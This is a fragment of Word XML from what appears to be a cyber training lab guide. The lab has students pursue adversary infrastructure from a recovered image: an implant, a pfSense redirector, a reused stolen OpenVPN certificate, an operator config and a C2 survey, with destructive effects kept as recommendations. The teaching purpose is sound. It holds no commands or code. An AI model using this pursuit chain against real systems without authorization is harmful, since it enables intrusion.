            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Where</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> | Listener bind addresses, callback destinations |</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve">| </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Why / How</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> | Infrastructure purpose and current state |</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>Report: how redirector access was obtained; how the OpenVPN cert was reused; how the operator cfg was obtained/modified; C2 state; recommended effects without execution.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t>4.3 Lesson summary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr/>
        <w:t>This lab is a pursuit from a recovered image, not a PCTE hostname scavenger hunt. Students prove implant → pfSense redirector → stolen OpenVPN → operator cfg → C2 survey, then report. Destructive effects stay recommendations.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Why start on the WSL image instead of nmap'ing the whole student LAN?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recovered artifact is the authorized start; callback evidence names the first hop.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be true before C2 staging answers?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They are on the OpenVPN overlay (or otherwise allowed by C2 iptables); lab-LAN paths are denied.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